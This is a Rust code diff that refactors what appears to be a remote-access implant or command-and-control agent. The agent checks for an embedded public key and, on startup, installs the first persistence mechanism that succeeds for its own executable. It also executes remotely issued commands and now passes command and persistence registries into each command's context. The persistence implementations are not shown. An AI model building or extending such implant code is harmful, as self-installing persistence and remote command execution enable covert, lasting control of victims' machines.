@@ -11,7 +11,8 @@ use ch_pid_lock::pid_lock::PidGuard;
 use std::sync::Arc;
 
 struct AgentExecutor {
-    registry: ch_commands::model::AgentCommandRegistry,
+    command_registry: Arc<ch_commands::model::AgentCommandRegistry>,
+    persistence_registry: Arc<ch_persistence::Registry>,
     store: Arc<ch_store::Store>,
 }
 
@@ -25,14 +26,20 @@ impl ch_transport::CommandExecutor for AgentExecutor {
         stdout: Box<dyn tokio::io::AsyncWrite + Send + Unpin>,
         stderr: Box<dyn tokio::io::AsyncWrite + Send + Unpin>,
     ) -> std::result::Result<(), String> {
-        if let Some(cmd) = self.registry.find(&command) {
+        if let Some(cmd) = self.command_registry.find(&command) {
             let (events_tx, _events_rx) = tokio::sync::mpsc::unbounded_channel();
+
+            let command_registry_copy = self.command_registry.clone();
+            let persistence_registry_copy = self.persistence_registry.clone();
+
             let ctx = ch_commands::model::AgentCommandContext {
                 stdin,
                 stdout,
                 stderr,
                 events: events_tx,
                 store: self.store.clone(),
+                command_registry: command_registry_copy,
+                persistence_registry: persistence_registry_copy,
             };
             cmd.execute(args, ctx)
                 .await
@@ -83,11 +90,11 @@ async fn main() -> Result<()> {
         .context("No embedded public key found in agent binary")?;
 
     tracing::info!("Loading persistence mechanisms...");
-    let persistence = ch_persistence::Registry::with_builtins();
+    let persistence_registry = Arc::new(ch_persistence::Registry::with_builtins());
 
     match std::env::current_exe() {
         Ok(exe_path) => {
-            if let Some(installed) = persistence.install_first_successful(&exe_path) {
+            if let Some(installed) = persistence_registry.install_first_successful(&exe_path) {
                 tracing::info!("Installed active persistence mechanism: {}", installed);
             } else {
                 tracing::warn!("No persistence mechanisms could be installed");
@@ -108,9 +115,11 @@ async fn main() -> Result<()> {
     }
     let store = Arc::new(ch_store::Store::open(&config.state_dir)?);
 
-    let registry = ch_commands::model::AgentCommandRegistry::with_builtins();
+    let command_registry = Arc::new(ch_commands::model::AgentCommandRegistry::with_builtins());
+    
     let executor = Arc::new(AgentExecutor {
-        registry,
+        command_registry,
+        persistence_registry,
         store,
     });
 
